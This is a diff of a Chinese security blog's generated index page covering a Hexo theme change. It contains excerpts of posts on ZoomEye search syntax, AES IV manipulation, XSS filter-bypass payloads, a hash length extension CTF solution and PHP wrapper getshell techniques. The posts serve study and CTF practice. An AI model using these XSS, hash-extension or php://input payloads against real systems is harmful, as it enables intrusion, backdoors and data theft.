@@ -1,90 +1,511 @@
 <!DOCTYPE html>
-<html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="utf-8">
-  
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ava.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ava.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="hack、share">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Sec-Communication">
 <meta property="og:url" content="http://yoursite.com/page/2/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en">
+<meta property="og:site_name" content="Sec-Communication">
+<meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
-</head>
-</html>
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-aes加密的安全问题" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/03/09/aes加密的安全问题/" class="article-date">
-  <time datetime="2019-03-08T16:00:00.000Z" itemprop="datePublished">2019-03-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/09/aes加密的安全问题/">aes加密的安全问题</a>
-    </h1>
+<meta name="twitter:title" content="Sec-Communication">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/page/2/">
+
+
+
+
+
+  <title>Sec-Communication</title>
   
 
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-Communication</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/13/钟馗之眼/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/13/钟馗之眼/" itemprop="url">钟馗之眼简单使用</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-13T00:00:00+08:00">
+                2019-03-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/173088" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173088</a> </p>
+      
+
+      
+        
+          
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>2013年，知道创宇基于互联网大数据基础测绘的理念，打造了“ZoomEye”(钟馗之眼)网络空间安全搜索引擎，针对全球网络空间基础设施、网络设备进行指纹特征检索，开创了国内网络空间资源测绘工作的先河。</p>
+<p>钟馗之眼是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
+<p>ZoomEye 支持公网设备指纹检索和 Web 指纹检索</p>
+<p>网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等</p>
+<h1 id="搜索常见命令"><a href="#搜索常见命令" class="headerlink" title="搜索常见命令"></a>搜索常见命令</h1><pre><code>定位国家---           country:US
+搜索城市---           city:xx
+搜索组件---           app:组件名
+搜索版本---           ver:5.0
+搜索端口---           port:80
+搜索服务名--         service：SSH
+搜索操作系统-        OS:Linux
+搜索网段---          cidr:1.1.1.1/24
+指定网站域名搜索--    site:www.baidu.com
+指定主机名---        hostname:www.baidu.com
+指定设备名---        device:router 
+指定首页关键词---     keyword:sec
+
+
+快捷键：
+显示帮助               shift+/  
+隐藏该帮助             ESC  
+回到首页               shift  
+高级搜索               Shift +s  
+聚焦搜索框              s  </code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/09/aes加密的安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/09/aes加密的安全问题/" itemprop="url">aes加密的安全问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-09T00:00:00+08:00">
+                2019-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/173088" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173088</a> </p>
 <h1 id="aes加密简介"><a href="#aes加密简介" class="headerlink" title="aes加密简介"></a>aes加密简介</h1><p>AES算法全称Advanced Encryption Standard,是DES算法的替代者，旨在取代DES成为广泛使用的标准，于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p>
 <p>AES是典型的对称加密算法，对称加密不同于md5 sha的哈希摘要算法，对称加密是可逆的，通常是明文+密钥，再利用算法来加密成密文，如果要还原也很简单，只要根据密钥+密文+生成算法的逆运算，即可解出，对称加密特点为可逆，并且加密解密都是使用同一个密钥，而非对称加密则是公钥私钥加解密模式这里不做讨论。</p>
 <h1 id="aes加密五种模式"><a href="#aes加密五种模式" class="headerlink" title="aes加密五种模式"></a>aes加密五种模式</h1><p>aes加密的方式有五种工作体制。  </p>
@@ -313,44 +734,125 @@ print iv_new</code></pre><p>替换掉原来的IV，即可正常sql查询。</p>
 <p>其余加密问题，后续我会补充到本文。</p>
 <p>参考：<a href="https://www.yourhome.ren/index.php/sec/366.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/366.html</a><br>参考：实验吧pcat师傅的writeup</p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/09/aes加密的安全问题/" data-id="ck0l0oh98000hpy2is60u26nh" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-XSS姿势小集" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/03/04/XSS姿势小集/" class="article-date">
-  <time datetime="2019-03-03T16:00:00.000Z" itemprop="datePublished">2019-03-04</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/04/XSS姿势小集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/04/XSS姿势小集/">XSS姿势小集</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/04/XSS姿势小集/" itemprop="url">XSS姿势小集</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-04T00:00:00+08:00">
+                2019-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。</p>
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。</p>
 <p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>
 <p>个人理解：XSS较为简单，理解起来也比较简单，一部分代码可控，并且显示在网页中，并且能够解析，就能够造成XSS漏洞，一般解析javascript来造成攻击。</p>
 <h1 id="转先知社区上几个payload（无过滤）"><a href="#转先知社区上几个payload（无过滤）" class="headerlink" title="转先知社区上几个payload（无过滤）"></a>转先知社区上几个payload（无过滤）</h1><p>参考：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
@@ -714,44 +1216,125 @@ javascript: 协议 XSS
 
 &lt;iframe src=&quot;javascript://https://domain.com/%250A1?alert(1):0&quot;&gt;</code></pre><h2 id="绕过单双引号分号"><a href="#绕过单双引号分号" class="headerlink" title="绕过单双引号分号"></a>绕过单双引号分号</h2><pre><code>https://xz.aliyun.com/t/4010</code></pre><p>参考：<a href="https://xz.aliyun.com/t/4414" target="_blank" rel="noopener">https://xz.aliyun.com/t/4414</a><br>参考：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a><br>参考：<a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067</a><br>参考：<a href="https://xz.aliyun.com/t/4074#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074#toc-1</a>  </p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/04/XSS姿势小集/" data-id="ck0l0oh95000apy2ix7pa1bwj" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-哈希长度拓展攻击" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/03/03/哈希长度拓展攻击/" class="article-date">
-  <time datetime="2019-03-02T16:00:00.000Z" itemprop="datePublished">2019-03-03</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/03/哈希长度拓展攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/03/哈希长度拓展攻击/">哈希长度拓展攻击</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/03/哈希长度拓展攻击/" itemprop="url">哈希长度拓展攻击</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T00:00:00+08:00">
+                2019-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>记录一道CTF题目，哈希长度拓展攻击，原理有点复杂，这里仅记录下用工具进行哈希长度拓展攻击。</p>
+      
+
+      
+        
+          
+            <p>记录一道CTF题目，哈希长度拓展攻击，原理有点复杂，这里仅记录下用工具进行哈希长度拓展攻击。</p>
 <p>题目地址：<a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/kzhan.php</a></p>
 <p>首先先安装下工具。</p>
 <h1 id="安装hashpump"><a href="#安装hashpump" class="headerlink" title="安装hashpump"></a>安装hashpump</h1><p>先安装哈希长度拓展攻击的工具，很容易百度到， 使用hashpump哈希长度拓展工具。 </p>
@@ -826,44 +1409,125 @@ admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
 <p><img src="https://i.imgur.com/kHEH3BG.png" alt></p>
 <p>得到flag。</p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/03/哈希长度拓展攻击/" data-id="ck0l0oh9u001qpy2ieqi3jiv5" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-身份认证劫持" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/02/28/身份认证劫持/" class="article-date">
-  <time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished">2019-02-28</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/28/身份认证劫持/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/28/身份认证劫持/">session，cookie认证会话安全问题</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/28/身份认证劫持/" itemprop="url">session，cookie认证会话安全问题</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-28T00:00:00+08:00">
+                2019-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>转：先知社区</p>
+      
+
+      
+        
+          
+            <p>转：先知社区</p>
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方就需要身份认证，对于不同的身份给予不同的权限，此时就用到会话这个概念。</p>
 <h1 id="为什么需要会话"><a href="#为什么需要会话" class="headerlink" title="为什么需要会话"></a>为什么需要会话</h1><p>首先要理解tcp的三次握手，一般在TCP三次握手就创建了一个会话，在会话中可以传递信息，等TCP关闭连接就关闭会话了。HTTP协议是基于TCP协议的，所以http会话也是在TCP关闭连接后就关闭会话，而在http1.1中，一般一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种凭证，才能使得每次请求服务器都知道是你，相当于建立了连续的会话，也就是每次的请求都带有自己的身份凭证。</p>
 <p>简单点，会话就是让你在信息交互的时候让对方知道你是谁，并且一直知道你是谁，但是服务器不是人，没有自我辨别的功能，这时候需要一种凭证，也就是session。站在客户端角度，在你每次登录帐号密码之后，会有一串类似于短秘钥之类的东西，他只属于你，证明你的身份。站在服务器端，在php中，在你进行身份认证之后，会在服务器端保存一个以PHPSESSID为名的文件来储存你的身份，账号等各种信息，在用户每次提交带有session的请求时，自动去搜索这个以session命名的文件，查看里面的反序列化信息（也就是你的身份等信息）。</p>
@@ -934,44 +1598,125 @@ if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
 <h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>在cookie的身份认证中，极容易造成越权，切大多数越权修改参数都是在cookie中修改，大多数cookie中会有用户的userid，如果未合理的处理或者多重认证，很容易造成越权。在某安全公司的一次测试中，正是由于一次id的接口错误的设置，导致数万用户的平行越权，遍历ID，造成信息的泄露。危害可见一斑。</p>
 <p>参考：<a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">https://blog.csdn.net/h_mxc/article/details/50542038</a><br>参考：<a href="https://blog.csdn.net/u010084228/article/details/78269345" target="_blank" rel="noopener">https://blog.csdn.net/u010084228/article/details/78269345</a></p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/28/身份认证劫持/" data-id="ck0l0oha2002cpy2iyt9y7afh" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-php协议漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/25/php协议漏洞/" class="article-date">
-  <time datetime="2018-12-24T16:00:00.000Z" itemprop="datePublished">2018-12-25</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/php协议漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/25/php协议漏洞/">php的协议漏洞</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/25/php协议漏洞/" itemprop="url">php的协议漏洞</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-25T00:00:00+08:00">
+                2018-12-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php://input"></a>1.php://input</h1><p>在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。</p>
+      
+
+      
+        
+          
+            <h1 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php://input"></a>1.php://input</h1><p>在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。</p>
 <p>前提  </p>
 <pre><code>1.在allow_url_include = On   
 2.PHP &gt;= 5.2.0</code></pre><p>当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。</p>
@@ -1085,44 +1830,125 @@ class TestObject {
 <p>在file_exists时候反序列化，还原了传入的php代码。</p>
